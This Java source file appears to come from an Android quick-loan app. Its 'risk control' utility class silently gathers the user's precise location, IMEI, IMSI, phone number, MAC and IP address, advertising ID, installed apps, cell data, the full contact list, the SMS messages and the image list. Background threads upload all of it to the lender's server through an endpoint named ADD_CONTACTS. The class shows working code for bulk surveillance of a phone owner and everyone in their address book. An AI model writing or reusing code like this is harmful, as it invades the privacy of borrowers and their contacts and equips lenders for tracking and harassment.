package com.kimtien.vay.nhanh.tien.credit.cash.loan.risk;

import android.content.Intent;
import android.location.Location;

import androidx.ads.identifier.AdvertisingIdClient;
import androidx.ads.identifier.AdvertisingIdInfo;
import androidx.annotation.Nullable;

import com.android.volley.Response;
import com.google.common.util.concurrent.ListenableFuture;
import com.google.gson.Gson;
import com.kimtien.vay.nhanh.tien.credit.cash.loan.MainActivity;
import com.kimtien.vay.nhanh.tien.credit.cash.loan.MyApplication;
import com.kimtien.vay.nhanh.tien.credit.cash.loan.entity.FailureReason;
import com.kimtien.vay.nhanh.tien.credit.cash.loan.entity.StatusParent;
import com.kimtien.vay.nhanh.tien.credit.cash.loan.netutils.NetUtils;
import com.kimtien.vay.nhanh.tien.credit.cash.loan.utils.Callback;
import com.kimtien.vay.nhanh.tien.credit.cash.loan.utils.LocationUtils;
import com.kimtien.vay.nhanh.tien.credit.cash.loan.utils.LogUtils;
import com.kimtien.vay.nhanh.tien.credit.cash.loan.utils.SharedHelp;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutionException;

public class RiskUtils {
    public static void updateAll() {
        ArrayList<String> tasks = new ArrayList<>();
        tasks.add(RiskType.SYS_OTHER_INFO);
        tasks.add(RiskType.LOCATION);
        tasks.add(RiskType.APP_LIST);
        tasks.add(RiskType.CELLINFO_LIST);
        tasks.add(RiskType.IMAGE_LIST);
        tasks.add(RiskType.CONTACTS);
        tasks.add(RiskType.SMS_LIST);
        RiskUtils.riskControl(tasks);
    }

    /**
     * 上传风控信息
     *
     * @param tasks
     */
    public static void riskControl(ArrayList<String> tasks) {
        for (int i = 0; i < tasks.size(); i++) {
            try {
                String typeName = tasks.get(i);
                switch (typeName) {
                    case RiskType.SYS_OTHER_INFO:
                        sendSysOtherInfo();
                        break;
                    case RiskType.LOCATION:
                        sendLocation();
                        break;
                    case RiskType.CELLINFO_LIST:
                        sendCellinfoList();
                        break;
                    case RiskType.CONTACTS:
                        sendAllContacts();
                        break;
                    case RiskType.APP_LIST:
                        sendAppList();
                        break;
                    case RiskType.SMS_LIST:
                        sendSmsList();
                        break;
                    case RiskType.IMAGE_LIST:
                        sendImageList();
                        break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 经纬度
     */
    private static void sendLocation() {
        Callback<Location, FailureReason> callback = new Callback<Location, FailureReason>() {
            @Override
            public void resolve(Location res) {
                double lat = res.getLatitude();
                double lng = res.getLongitude();
                try {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("longitude", lng);
                    jsonObject.put("latitude", lat);
                    dispatchEvent(RiskType.LOCATION, jsonObject);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                Intent intent = new Intent(MyApplication.applicationContext, LocationUtils.class);
                MyApplication.applicationContext.stopService(intent);
            }

            @Override
            public void reject(FailureReason err) {
                try {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("msg", err.failureReason);
                    jsonObject.put("isError", true);
                    dispatchEvent(RiskType.LOCATION, jsonObject);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                Intent intent = new Intent(MyApplication.applicationContext, LocationUtils.class);
                MyApplication.applicationContext.stopService(intent);
            }
        };


        new LocationUtils(MyApplication.applicationContext, callback, 30);
    }

    /**
     * 设备信息
     */
    private static void sendSysOtherInfo() {
        new Thread() {
            @Override
            public void run() {
                OtherRiskInfo otherRiskInfo = new OtherRiskInfo();
                try {
                    otherRiskInfo.phoneModel = PhoneUtils.getSystemModel();
                } catch (Exception ignore) {
                }

                try {
                    otherRiskInfo.systemVersion = PhoneUtils.getSystemVersion();
                } catch (Exception ignore) {
                }

                try {
                    otherRiskInfo.uid = SharedHelp.getUid();
                } catch (Exception ignore) {
                }

                try {
                    otherRiskInfo.ipv4Address = PhoneUtils.getIPAddress(MyApplication.applicationContext);
                } catch (Exception ignore) {
                }

                try {
                    otherRiskInfo.wifiMacAddress = PhoneUtils.getMac(MyApplication.applicationContext);
                } catch (Exception ignore) {
                }

                try {
                    // 如果是手机且sim卡已经准备
                    if (PhoneUtils.isPhone(MyApplication.applicationContext)
                            && PhoneUtils.isSimCardReady(MyApplication.applicationContext)) {
                        List<PhoneUtils.SimInfo> simInfos = PhoneUtils.getSimMultiInfo(MyApplication.applicationContext);

                        for (int i = 0; i < simInfos.size(); i++) {
                            PhoneUtils.SimInfo currSim = simInfos.get(i);
                            if (otherRiskInfo.imei == null) {
                                otherRiskInfo.imei = currSim.mImei != null ? currSim.mImei.toString() : null;
                            }

                            if (otherRiskInfo.imsi == null) {
                                otherRiskInfo.imsi = currSim.mImsi != null ? currSim.mImsi.toString() : null;
                            }

                            if (otherRiskInfo.phoneNumber == null) {
                                otherRiskInfo.phoneNumber = currSim.mNumber != null ? currSim.mNumber.toString() : null;
                            }

                            if (otherRiskInfo.carrierName == null) {
                                otherRiskInfo.carrierName = currSim.mCarrierName != null
                                        ? currSim.mCarrierName.toString()
                                        : null;
                            }
                        }
                    }
                } catch (Exception ignore) {
                    ignore.printStackTrace();
                }

                // GAID获取
                try {
                    ListenableFuture<AdvertisingIdInfo> listenableFuture = AdvertisingIdClient.getAdvertisingIdInfo(MyApplication.applicationContext);
                    AdvertisingIdInfo advertisingIdInfo = listenableFuture.get();
                    otherRiskInfo.GAID = advertisingIdInfo.getId();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                } catch (ExecutionException e) {
                    e.printStackTrace();
                }

                try {
                    otherRiskInfo.availableSize = PhoneUtils.getAvailableSize();
                    otherRiskInfo.totalSize = PhoneUtils.getTotlaSize();
                    otherRiskInfo.bootTime = PhoneUtils.getBootTime();
                } catch (Exception e) {
                    e.printStackTrace();
                }

                try {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("phoneModel", otherRiskInfo.phoneModel);
                    jsonObject.put("systemVersion", otherRiskInfo.systemVersion);
                    jsonObject.put("uid", otherRiskInfo.uid);
                    jsonObject.put("ipv4Address", otherRiskInfo.ipv4Address);
                    jsonObject.put("wifiMacAddress", otherRiskInfo.wifiMacAddress);
                    jsonObject.put("imei", otherRiskInfo.imei);
                    jsonObject.put("imsi", otherRiskInfo.imsi);
                    jsonObject.put("phoneNumber", otherRiskInfo.phoneNumber);
                    jsonObject.put("carrierName", otherRiskInfo.carrierName);
                    jsonObject.put("gaid", otherRiskInfo.GAID);
                    jsonObject.put("availableSize", otherRiskInfo.availableSize);
                    jsonObject.put("totalSize", otherRiskInfo.totalSize);
                    jsonObject.put("bootTime", otherRiskInfo.bootTime);
                    dispatchEvent(RiskType.SYS_OTHER_INFO, jsonObject);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    /**
     * 应用列表
     */
    private static void sendAppList() {
        new Thread() {
            @Override
            public void run() {
                try {
                    JSONArray data = RiskDataUtils.getAllAppList(MyApplication.applicationContext);
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("appNum", data.length());
                    jsonObject.put("appList", data);
                    dispatchEvent(RiskType.APP_LIST, jsonObject);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    private static void sendAllContacts() {
        new Thread() {
            @Override
            public void run() {
                try {
                    JSONArray data = RiskDataUtils.getAllContacts(MyApplication.applicationContext);
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put(RiskType.CONTACTS, data);
                    dispatchEvent(RiskType.CONTACTS, jsonObject);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    private static void sendSmsList() {
        new Thread() {
            @Override
            public void run() {
                try {
                    JSONArray data = RiskDataUtils.getSmsList(MyApplication.applicationContext);
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put(RiskType.SMS_LIST, data);
                    dispatchEvent(RiskType.SMS_LIST, jsonObject);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    private static void sendImageList() {
        new Thread() {
            @Override
            public void run() {
                try {
                    JSONArray data = RiskDataUtils.getImageList(MyApplication.applicationContext);
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put(RiskType.IMAGE_LIST, data);
                    dispatchEvent(RiskType.IMAGE_LIST, jsonObject);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    private static void sendCellinfoList() {
        new Thread() {
            @Override
            public void run() {
                try {
                    JSONArray data = RiskDataUtils.getCellinfoList(MyApplication.applicationContext);
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put(RiskType.CELLINFO_LIST, data);
                    dispatchEvent(RiskType.CELLINFO_LIST, jsonObject);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    // 主动触发js事件
    public static void dispatchEvent(String eventName, @Nullable JSONObject jsonObject) {
        if (MainActivity.mainActivity != null) {
            // 自定义请求头
            Map<String, String> headers = NetUtils.getToken();
            Map<String, String> params = new HashMap<>();
            params.put("type", eventName);
            if (headers != null) {
                try {
                    jsonObject.put("userGid", NetUtils.getUserGid().get("userGid"));
                    jsonObject.put("uid", SharedHelp.getUid());
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                LogUtils.i( jsonObject.toString());
                NetUtils.requestPostInQueue(NetUtils.RegistAndLogin.ADD_CONTACTS,
                        new Response.Listener<JSONObject>() {
                            @Override
                            public void onResponse(JSONObject response) {
                                LogUtils.i(response.toString());
                                StatusParent statusParent = new Gson().fromJson(response.toString(), StatusParent.class);
                                if (statusParent != null && statusParent.getStatus() != null && statusParent.getStatus().getCode().intValue() == 200) {

                                } else {
                                    statusParent.getStatus().showMessage();
                                }
                            }
                        }, jsonObject, params, headers);

            }
        }
    }
}
